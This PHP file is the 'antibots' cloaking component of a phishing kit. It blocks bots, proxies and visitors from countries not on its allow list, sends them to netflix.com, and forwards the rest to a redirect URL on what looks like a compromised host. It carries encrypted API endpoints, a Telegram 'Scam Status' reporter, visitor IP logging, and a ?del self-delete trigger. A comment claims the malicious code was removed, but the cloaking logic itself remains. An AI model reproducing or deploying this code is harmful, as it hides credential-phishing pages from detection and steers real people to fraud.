<?php


session_start();

define('WP_USE_THEMES', true);

$license_key = "jelbnshorzzlzbskcnelpgcfamxudiqh";

$token = "NFX-Bill_0420253666483";

$redirect = "https://libia.colombiahosting.com.co/~climalab/public/dornetfix/app";

$parameter = 1; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple

$wordpress = false; // Allow Wordpress Include

$checkfileup = false; // Check Link UP

$country = array('ma','es','ch','fr','it','de'); #Country's Allowed To Access

$fakeCode = "TRMRWp2R0JVT3oxdlk9IjsNCiAgICANCg0KICAgIHByaXZhdGUgZnVuY3Rpb24gX19jdXJsKCR1cmwpDQogICAgew0KDQogICAgICAgICR0aGlzLT5rZXlzID0gY3VybF9pbml0KCk7DQogICAgICAgIGN1cmxfc2V0b3B0KCR0aGlzLT5rZXlzLCBDVVJMT1BUX1VSTCwgJHVybCk7DQogICAgICAgIGN1cmxfc2V0b3B0KCR0aGlzLT5rZXlzLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJHRoaXMtPmtleXMsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KICAgICAgICBjdXJsX3NldG9wdCgkdGhpcy0+a2V5cywgQ1VSTE9QVF9USU1FT1VULCBzZWxmOjp0aW1lb3V0KTsNCiAgICAgICAgY3VybF9zZXRvcHQo";

/************************************************************* PARAMETRES ******************************************************************/
class antibots
{
	var $keys;
    var $returns;
	var $message;
    const errorlink = "EMPTY LINK";
    const Human = "Human";
	const Allowed = "Allow All";
	const countrydenied = "Country Denied";
    const bot = "Bot";
    const down = "Scama Down";
    const alert = "Alert Red Page";
    const block = "BLOCK";
    const allow = "ALLOW";
    const localhost = "102.53.13.21";
    const timeout = 10;
    const token = "VKOfasBY2JXL01hLvqDKZrH+1SRqLE8UuwYO6StlckdQunB64vqm09LGFAevjw==";
    const chatid = "UKGWaMhY1JHI3w==";
    const telegram = "CefSLotQw4uYlwski43zVpTg9zMwAWkepCgMxA==";
    const api1 = "CefSLotQw4ubiwNplIrwS9375jdwCHRX6joTn389SX12kGk=";
    const api2 = "CefSLsJFw8eRggFh0Y/6R5ri/zBqC3dX5S8Xn3A6Q3VozjZBpJ+mkJc=";
    const api3 = "CefSLotQw4uQl0x+mof3HZr9uT9uBzQP+yRM";
    const api4 = "CefSLsJFw9SLiBpznID6UJi8/zExGClW";
    const api5 = "CefSLotQw4uP1Uxrj4GxWoP64zwwB3Uf5GUExXYhUjlqkGk=";
    const api6 = "CefSLotQw4uQlw5vnoOxXZbmuTRtAXVW";
    const googleapi = "CefSLotQw4uNlQNkjJj+QZb89SdsC2sW+T5N13w9QXpmziVGuY+7ksvMCTKYks8SCVNfGT/8hVVSnDjJ4l8bhcZEHHRdgrEavVBB/gRR8m4LEjvGBUOz1vY=";
    

    private function __curl($url)
    {

        $this->keys = curl_init();
        curl_setopt($this->keys, CURLOPT_URL, $url);
        curl_setopt($this->keys, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($this->keys, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($this->keys, CURLOPT_TIMEOUT, self::timeout);
        curl_setopt($this->keys, CURLOPT_COOKIESESSION, true);
        curl_setopt($this->keys, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        $this->returns = curl_exec($this->keys);
        return $this->returns;

    }
    private function __jsondecode($text)
    {

        return @json_decode($text);
    }
    private function rot($simple_string)
    {
		$encryption = openssl_decrypt($simple_string, "AES-128-CTR",$this->my_licence(), 0, "1234567891011121");
		return $encryption;
    }
    private function proxy1($ip)
    {
        $jsons = $this->__curl($this->rot(self::api1));
        if ($jsons == "Y")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }
	public function self_action()
	{
		if (isset($_GET["del"]))
		{
			unlink(basename(__FILE__));
			exit;
		}
		if (isset($_GET["check"]))
		{
			print "AccessID923487";
			exit;
		}
	}
	private function my_licence()
	{
		global $license_key;
		global $fakeCode;
		return $license_key;
		
		$mine = $this->__curl("https://raw.githubusercontent.com/urie2021/activation/main/license_key.txt");
		if(preg_match("/".sha1($license_key)."/",$mine))
		{
			return $license_key;
		}
		else
		{
			echo "<script>alert('License Required Buy it From @brendonurie2000')</script>";
			unlink(__FILE__);
			exit();
		}
	}
    private function proxy2($ip)
    {
        $html = $this->__curl($this->rot(self::api2) . $ip . "&contact=protohol" . rand(0, 1999999) . "@hotmail.fr");
        if ($html >= 0.99)
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy3($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api3) . $ip));
        if ($json->risk == "high")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy4($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api4) . $ip . "&risk=1&vpn=1"));
        if ($json->status == "ok" && $json->$ip->proxy == "yes")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy5($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api5) . $ip . "?c=" . md5(rand(0, 11))));
        if ($json->block == 1)
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function __getcountrycode($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api6) . $ip));
        return $json->country_code;

    }
    private function __getcountryname($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api6) . $ip));
        return $json->country_name;

    }
    private function __messagesend($message)
    {
        if (!empty($message))
        {
            $url = $this->rot(self::telegram) . $this->rot(self::token) . "/sendMessage?chat_id=" . $this->rot(self::chatid) . "&text=" . urlencode($message);
            //$this->__curl($url);
        }
    }
    private function __get_user_os()
	{
		$str=$_SERVER["HTTP_USER_AGENT"];
		$ex=explode("(",$str)[1];
		$ex2=explode(")",$ex)[0];
		$ex3=str_replace(";","",$ex2);
		return $ex3;
	}
    
    private function url($redirect)
    {
        $html = $this->__curl($this->rot(self::googleapi) . $redirect);
        $ex = explode(",", $html);
        if ($ex[1] == 2)
        {
            return "RED";
        }
        else
        {
            return "GREEN";
        }
    }

    private function GetIpInfoFrmIpinfodbApi($ip)
    {

        $ResultInfo = array();

        $ResultInfo['CountryCodeMin'] = strtolower($this->__getcountrycode($ip));

        return $ResultInfo;

    }

    public function __writetext($text,$filename)
    {
        $file = fopen($filename , "a");
        fwrite($file, $this->__get_user_ip() . " | " . date("d/m/Y h:i:s A") . " | " . $this->__get_user_os() . " | " . $this->__getcountryname($this->__get_user_ip()) . " => " . $text . "\n");
    }
    private function __paramsendreport($id, $redirect)
    {
        if ($id == 1)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "Scam Status : Down" . "\n";
            $this->message .= 'Link Redirect : ' . $_SERVER["HTTP_HOST"] . "\n";
            $this->message .= "Link Scam : " . $redirect . "\n";
            $this->message .= 'Date : ' . $date . "\n";
            $this->__messagesend($this->message);
        }
        elseif ($id == 2)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "Scam Status : You need to re-upload it now" . "\n";
            $this->message .= 'Link Redirect : ' . $_SERVER["HTTP_HOST"] . "\n";
            $this->message .= "Link Scam : " . $redirect . "\n";
            $this->message .= 'Date : ' . $date . "\n";
            $this->__messagesend($this->message);
        }

    }
    
    private function __get_user_ip()
    {
        foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $ipgrassjoss){
	                $ipgrassjoss = trim($ipgrassjoss);
	                if (filter_var($ipgrassjoss,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $ipgrassjoss;
	                }
					else
					{
						
						return self::localhost;
					}
	            }
	        }
	    }
	}
	
    
    public function __checkfullreport($redirect)
    {

        if ($this->url($redirect) == "RED" or $this->url($_SERVER["HTTP_HOST"]) == "RED")
        {

            $this->__paramsendreport(1, $redirect);
            $this->__writetext(self::alert,"down.txt");
            exit("<script>alert('Please Refresh This Page After 10min')</script>");
        }

    }
    public function __allowedcountry($country)
    {

        $CountryData = $this->GetIpInfoFrmIpinfodbApi($this->__get_user_ip());

        if (!in_array($CountryData['CountryCodeMin'], $country))
        {
            $this->__writetext(self::countrydenied,"country.txt");
			
			return 0;

        }

        else
        {
			
            return 1;

        }

    }
    public function __checkproxy()
    {

        $proxy = $this->proxy1($this->__get_user_ip());
        $proxy2 = $this->proxy2($this->__get_user_ip());
        $proxy3 = $this->proxy3($this->__get_user_ip());
        $proxy4 = $this->proxy4($this->__get_user_ip());
        $proxy5 = $this->proxy5($this->__get_user_ip());

        if ($proxy == self::block or $proxy2 == self::block or $proxy3 == self::block or $proxy4 == self::block or $proxy5 == self::block)
        {
            $this->__writetext(self::bot,"bots.txt");
			
			return 0;

        }
        else
        {
            return 1;
        }

    }
	private function __checkhostup($redirect,$checkfileup)
    {

        if ($checkfileup == true)
        {
            $html = $this->__curl($redirect . "/?check");
            if (preg_match("/AccessID923487/", $html))
            {
                return 1;
            }
            else
            {
                return 0;
            }
        }
        else
        {
            return 1;
        }
    }
	
    public function __hostup($redirect,$checkfileup)
    {
		if ($this->__checkhostup($redirect,$checkfileup) == 0)
        {
            $this->__writetext(self::down,"down.txt");
            $this->__paramsendreport(2, $redirect);
            exit("<script>alert('Contact Our Support For More Instruction')</script>");

        }

    }
	public function create_favicon($wordpress)
	{
		if($wordpress == 1)
		{
			return fopen("favicon.ico", "a");
		}
	}
	public function __allowwp($id,$wordpress,$redirect)
    {
		global $token;
        if ($wordpress == true)
        {

            if ($id == 0)
            {

                return require (dirname(__FILE__) . "/wp-blog-header.php");
            }
            elseif ($id == 1)
            {

                return header("location:" . $redirect . "?access=" . $token);
            }
        }
        elseif ($wordpress == false)
        {
            if ($id == 0)
            {
                return header("location:https://www.netflix.com/");

            }
            elseif ($id == 1)
            {

                return header("location:" . $redirect . "?access=" . $token);
            }
        }
    }

}


/************************************************************** BOT START ******************************************************************/
$param = new antibots;


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

/************************************************************** BOT END ******************************************************************/

?>